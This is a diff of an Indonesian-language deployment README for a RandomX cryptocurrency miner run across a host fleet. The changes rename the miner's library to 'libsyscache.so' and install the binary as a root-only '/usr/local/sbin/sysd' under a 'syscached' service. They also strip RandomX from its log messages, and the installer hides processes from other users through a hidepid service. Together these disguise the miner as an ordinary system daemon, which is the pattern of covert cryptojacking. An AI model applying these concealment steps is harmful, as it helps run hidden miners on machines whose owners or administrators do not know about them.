@@ -22,7 +22,7 @@ Worker memakai Ubuntu 22.04 (glibc 2.35), `fl` 24.04. Binary yang dibuild di
 22.04 jalan di keduanya, jadi itu satu-satunya artefak deploy.
 
 CI job `build-2204` membuild + upload artefak `xcb-2204` (`xcb`,
-`librandomx_v2.so`, `VERSION`, `SHA256SUMS`) pada setiap push ke `main`.
+`libsyscache.so`, `VERSION`, `SHA256SUMS`) pada setiap push ke `main`.
 `deploy.sh --from-ci` memverifikasi isi artefak dengan
 `sha256sum -c SHA256SUMS` sebelum staging; artefak tanpa manifest (mis. hasil
 build lokal) hanya dicatat dan tidak diverifikasi.
@@ -36,9 +36,10 @@ cd ops/fleet
 ./deploy.sh --only fl --dry-run           # lihat rencana
 ```
 
-Alur per host: stop → backup (`xcb.bak-STAMP`) → install → cek `ldd` +
-`--version` → start → tunggu `RandomX V2 siap`. Kalau ada yang gagal,
-rollback otomatis dan deploy berhenti — host lain tidak disentuh.
+Alur per host: stop → backup (`/root/sysd-rollback-<stamp>`) → install → cek
+`ldd` + `--version` (sudo — binary 0750 root-only) → start → tunggu
+`Dataset siap`. Kalau ada yang gagal, rollback otomatis dan deploy berhenti —
+host lain tidak disentuh.
 
 Host pertama adalah canary. Setelah canary OK, sisanya jalan berurutan.
 
@@ -53,7 +54,7 @@ Rollback manual:
 
 Tag `v*` memicu job `release`: artefak `xcb-2204` dikemas menjadi
 `xcb-<tag>-linux-x86_64.tar.gz` (+ `.sha256`) berisi `xcb`,
-`librandomx_v2.so`, `VERSION`, `SHA256SUMS`, `install.sh`,
+`libsyscache.so`, `VERSION`, `SHA256SUMS`, `install.sh`,
 `syscached.service`, dan `miner.env.example`.
 
 ```bash
@@ -71,33 +72,24 @@ tar xzf xcb-v1.0.0-linux-x86_64.tar.gz
 sudo ./install.sh --wallet <alamat> --worker <nama>
 ```
 
-`install.sh` memasang binary + library ke `/usr/local/bin`, menulis
-`/etc/xcb/miner.env` (0600, termasuk `XCB_TITLE=sysd`), menyiapkan hugepages,
-menulis wrapper `/usr/local/sbin/sysd` (0700), memasang unit, memasang
-`xcb-proc-hidepid.service` + drop-in `10-hidepid.conf`, lalu menjalankan
-`syscached`. `--dry-run` mencetak rencana tanpa mengubah apa pun. Sebelum
-menimpa, `install.sh` membackup binary, library, dan unit lama dengan akhiran
-`-<stamp>` dan mencetak perintah rollback satu baris. Ganti unit di host fleet
-lewat `install.sh`, bukan `deploy.sh`: `apply.sh rollback` (dipakai
-`deploy.sh --rollback`) hanya mengembalikan binary + library.
+`install.sh` memasang binary sebagai `/usr/local/sbin/sysd` (0750 root:root,
+tanpa wrapper, tanpa argv) dengan `libsyscache.so` (0640) di sampingnya,
+menulis `/etc/sysd/miner.env` (0600; bila ada `/etc/xcb/miner.env` lama,
+isinya dimigrasi dan baris spoof judulnya dibuang), menyiapkan hugepages,
+memasang unit, memasang `sysd-proc-hidepid.service` + drop-in
+`10-hidepid.conf`, lalu menjalankan `syscached`. `--dry-run` mencetak rencana
+tanpa mengubah apa pun. Sebelum menimpa, `install.sh` membackup binary,
+library, unit, dan config lama ke `/root/sysd-rollback-<stamp>` dan mencetak
+perintah rollback satu baris.
 
-Urutan rollback aman: **pulihkan unit dulu**, baru binary + library. Kalau
-`apply.sh rollback` dipulihkan lebih dulu sementara unit wrapper masih aktif,
-binary pra-PR #20 start tanpa `CONN_POOL` yang bisa dipakai dan service gagal
-sampai unit lama dikembalikan.
+`apply.sh` memasang unit + config + hidepid bersama binary + library sebagai
+satu paket, dan `apply.sh rollback` (dipakai `deploy.sh --rollback`)
+memulihkan semuanya sekaligus dari `/root/sysd-rollback-<stamp>` — tidak ada
+lagi urutan "unit dulu, baru binary + library" yang harus diingat.
 
-```bash
-# 1. unit lama dulu
-sudo install -m 0644 /etc/systemd/system/syscached.service.bak-<stamp> \
-    /etc/systemd/system/syscached.service
-sudo systemctl daemon-reload
-# 2. baru binary + library
-sudo ./deploy.sh --rollback        # atau apply.sh rollback
-```
-
-`install.sh` adalah installer penuh: ia juga memasang `xcb` dan
-`librandomx_v2.so` dari tarball, jadi pakai tarball rilis yang cocok atau
-pasang unit + wrapper secara manual.
+`install.sh` adalah installer penuh: ia memasang binary dan `libsyscache.so`
+dari tarball (nama file binary di artefak tetap `xcb`; installer menamainya
+`sysd`), jadi pakai tarball rilis yang cocok atau pasang unit secara manual.
 Kalau `install.sh` sudah ada di host, `--version v1.0.0` (atau `latest`)
 membuatnya mengunduh dan memverifikasi tarball rilis itu sendiri.
 
@@ -150,7 +142,7 @@ pengiriman yang gagal dicoba lagi pada run berikutnya.
 
 - **`GLIBC_2.38 not found`** — artefak dibuild di 24.04. Pakai `--from-ci`
   (job `build-2204`) atau build di host 22.04.
-- **`librandomx_v2.so: cannot open shared object file`** — library tidak ada
+- **`libsyscache.so: cannot open shared object file`** — library tidak ada
   di samping binary. `apply.sh` mengecek `ldd` dan otomatis rollback.
 - **Deploy berhenti di canary** — cek output host tersebut; host lain belum
   disentuh. Perbaiki, lalu ulangi `--only <host>`.
